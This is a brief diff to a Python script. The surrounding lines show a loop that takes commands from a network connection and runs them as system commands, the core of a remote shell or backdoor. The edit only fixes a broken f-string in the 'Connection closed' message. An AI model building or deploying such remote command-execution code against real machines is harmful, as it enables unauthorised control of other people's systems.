@@ -15,7 +15,7 @@ while True:
     command = connection.recv(1024)
 
     if command=='exit':
-        connection.send(f'\n[x] Connection closed ...}\n')
+        connection.send('\n[x] Connection closed ...\n')
         break
 
     result = execute_system_command(command)
